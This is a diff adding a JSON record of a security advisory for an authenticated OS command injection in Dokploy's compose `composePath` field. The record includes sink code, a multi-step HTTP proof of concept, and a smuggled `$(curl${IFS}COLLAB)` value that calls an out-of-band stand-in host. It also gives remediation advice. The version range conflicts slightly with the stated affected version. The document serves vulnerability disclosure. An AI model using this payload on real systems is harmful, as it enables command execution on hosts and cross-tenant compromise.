@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-8r5w-vqjr-8c44",
+  "repo": {
+    "cve_id": "CVE-2026-72865",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "| | |\r\n|---|---|\r\n| **Affected version** | v0.29.8 (commit `e9a0932b2`) |\r\n| **Component** | `@dokploy/server` - Docker Compose build/deploy |\r\n| **Authentication** | Authenticated; `member` with compose write+deploy permission |\r\n| **Status** | Confirmed via out-of-band code execution (Burp Collaborator) |\r\n\r\n## 1. Summary\r\nA Compose service stores a user-controlled `composePath` (the path to the compose file). It is\r\ninterpolated **unquoted** into several shell commands at build/deploy/start time - `docker compose -f\r\n${composePath}`, `docker stack deploy -c ${composePath}`, and `touch ${envFilePath}` (where\r\n`envFilePath` is derived from `composePath`) - all executed via `/bin/sh -c`. A crafted `composePath`\r\nyields OS command execution on the host. `composePath` is a *path* field that no operator would expect\r\nto be a command vector, and it has no validation.\r\n\r\n## 2. Affected code\r\n- **Sinks** - `packages/server/src/utils/builders/compose.ts`\r\n  ```js\r\n  command = `compose -p ${appName} -f ${path} up -d --build --remove-orphans`;   // :91 (path = composePath)\r\n  command = `stack deploy -c ${path} ${appName} --prune --with-registry-auth`;    // :93\r\n  // executed as:  ... docker ${command.split(\" \").join(\" \")} ...                 // :57 (no escaping)\r\n  // env file:\r\n  const composeFilePath = join(COMPOSE_PATH, appName, \"code\", composePath);       // :103\r\n  return `touch ${envFilePath}; echo \"${b64}\" | base64 -d > \"${envFilePath}\";`;   // :126 (envFilePath from composePath, unquoted touch)\r\n  ```\r\n  and `services/compose.ts:475` `startCompose`: `env -i ... docker compose -p ${appName} -f ${path} up -d`.\r\n- **Execution** - `services/compose.ts:255-278` `execAsync(commandWithLog)` / `execAsyncRemote`.\r\n- **Entry point (no validation)** - `compose.update` (`apps/dokploy/server/api/routers/compose.ts:193`)\r\n  sets `composePath` (`apiUpdateCompose`/`apiCreateCompose`: `composePath: z.string().min(1)`,\r\n  `db/schema/compose.ts:164`, no regex).\r\n\r\n## 3. Authorization / reachability\r\n`compose.create`/`update` and `compose.deploy`/`start` are gated only by\r\n`checkServicePermissionAndAccess` (no org check for owner/admin). Reachable by a `member` with compose\r\nwrite+deploy, and cross-tenant by an owner/admin of another organization.\r\n\r\n## 4. Proof of Concept (Burp)\r\n**Step 0 - Authenticate** (Appendix A). **Step 1** - create a project → `ENV_ID`.\r\n\r\n**Step 2 - Create a compose service:**\r\n```http\r\nPOST /api/trpc/compose.create?batch=1 HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/json\r\nCookie: better-auth.session_token=COOKIE\r\nConnection: close\r\n\r\n{\"0\":{\"json\":{\"name\":\"poc\",\"description\":\"\",\"environmentId\":\"ENV_ID\",\"composeType\":\"docker-compose\",\"appName\":\"poc-compose\",\"composeFile\":\"services:\\n  web:\\n    image: nginx\"}}}\r\n```\r\n\r\n**Step 3 - Set `sourceType:\"raw\"` and the payload `composePath`** (payload placed in a directory\r\ncomponent so it reaches the `touch ${envFilePath}` sink for all source types; `${IFS}` substitutes for\r\nthe disallowed space):\r\n```http\r\nPOST /api/trpc/compose.update?batch=1 HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/json\r\nCookie: better-auth.session_token=COOKIE\r\nConnection: close\r\n\r\n{\"0\":{\"json\":{\"composeId\":\"COMPOSE_ID\",\"sourceType\":\"raw\",\"composePath\":\"poc$(curl${IFS}COLLAB)/dc.yml\"}}}\r\n```\r\n\r\n**Step 4 - Deploy:**\r\n```http\r\nPOST /api/trpc/compose.deploy?batch=1 HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/json\r\nCookie: better-auth.session_token=COOKIE\r\nConnection: close\r\n\r\n{\"0\":{\"json\":{\"composeId\":\"COMPOSE_ID\"}}}\r\n```\r\n\r\n**Step 5 - Observe.** The Collaborator receives an HTTP request (`User-Agent: curl/8.18.0`) from the\r\nDokploy host - the `$(curl${IFS}COLLAB)` in `composePath` executed via `/bin/sh -c`.\r\n\r\n> Note: the build script wraps its steps in `{ ... } || { ... }`, which suppresses `set -e`; execution\r\n> therefore continues past the failed `touch`, so the deploy may also start the compose's containers\r\n> (in addition to running the injected command). For non-`raw` sources, the `docker compose -f\r\n> ${composePath}` sink fires after a successful source checkout.\r\n\r\n## 5. Impact\r\nArbitrary OS command execution on the host (or `serverId`) as the Dokploy/Docker-privileged process.\r\nCross-tenant via an owner/admin of another organization.\r\n\r\n## 6. Remediation\r\n- Validate `composePath` as a relative path confined to the build directory (no `..`, no shell\r\n  metacharacters). Invoke `docker compose`/`docker stack` via `execFile`/argument arrays. Also note the\r\n  `compose.command` field is passed to the shell after only `sanitizeCommand` (which strips per-token\r\n  surrounding quotes but not `;`/`$()`/backticks) - constrain it as well. Enforce tenant isolation.\r\n\r\n## Appendix A - Authentication\r\n```http\r\nPOST /api/auth/sign-in/email HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"email\":\"USER@EXAMPLE.COM\",\"password\":\"PASSWORD\"}\r\n```",
+    "ghsa_id": "GHSA-8r5w-vqjr-8c44",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-8r5w-vqjr-8c44",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-8r5w-vqjr-8c44"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-72865"
+      }
+    ],
+    "published_at": "2026-07-21T23:24:52Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "OS Command Injection via compose `composePath`",
+    "updated_at": "2026-08-10T18:32:18Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "Dokploy"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "< 0.29.8 "
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
